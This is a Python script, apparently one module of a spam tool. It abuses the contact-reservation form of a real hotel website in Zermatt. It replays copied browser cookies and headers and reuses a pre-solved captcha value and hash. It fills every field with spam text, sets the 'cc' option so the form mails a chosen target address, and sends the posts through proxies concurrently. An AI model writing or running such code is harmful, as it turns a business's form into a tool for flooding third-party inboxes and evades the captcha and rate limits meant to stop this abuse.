cookies = {
    '__utma': '106952476.367495367.1677760737.1677760737.1677760737.1',
    '__utmc': '106952476',
    '__utmz': '106952476.1677760737.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided)',
    '__utmt': '1',
    '__utmb': '106952476.2.10.1677760737',
}

headers = {
    'authority': 'narnia-zermatt.ch',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    # 'cookie': '__utma=106952476.367495367.1677760737.1677760737.1677760737.1; __utmc=106952476; __utmz=106952476.1677760737.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); __utmt=1; __utmb=106952476.2.10.1677760737',
    'origin': 'https://narnia-zermatt.ch',
    'pragma': 'no-cache',
    'referer': 'https://narnia-zermatt.ch/en/contact-reservation.html',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
}

s = 'Many thanks '
from os.path import basename

import requests

from module import Spam


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        test = self.get_text()
        data = {
            'FORM_SUBMIT': 'auto_form_2',
            'REQUEST_TOKEN': '',
            'title': 'Mrs',
            'first_name': test,
            'surname': test,
            'address': test,
            'zip_city': test,
            'country': test,
            'phone': test,
            'email': target,
            'number_adultrs': test,
            'number_children': test,
            'your-message': test,
            'cc': [
                '',
                'cc',
            ],
            'captcha_41': '15',
            'captcha_41_hash': '909c37d0382b38f85f80bdad04b8bca797e90577b7da2fe9801907aa611593d4',
            'captcha_41_name': '',
        }

        response = requests.post('https://narnia-zermatt.ch/en/contact-reservation.html', cookies=cookies,
                                 headers=headers, data=data, proxies=self.get_proxies())
        return response


def main():
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    if res:
        spam.run_concurrently()


if __name__ == '__main__':
    main()
